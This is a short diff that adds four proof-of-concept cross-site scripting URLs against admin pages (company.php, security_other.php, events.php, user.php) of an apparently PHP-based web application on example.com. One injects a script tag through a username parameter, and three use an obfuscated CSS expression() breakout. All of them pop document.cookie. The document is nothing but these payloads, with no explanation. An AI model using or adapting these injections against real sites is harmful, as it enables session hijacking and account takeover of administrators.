@@ -1,0 +1,7 @@
+http://www.example.com/admin/company.phpmainmenu=home&leftmenu=setup&username='"</script><script>alert(document.cookie)</script>
+
+http://www.example.com/admin/security_other.php/" stYle="x:expre/**/ssion(alert(document.cookie))
+
+http://www.example.com/admin/events.php/" stYle="x:expre/**/ssion(alert(document.cookie))
+
+http://www.example.com/admin/user.php/" stYle="x:expre/**/ssion(alert(document.cookie))
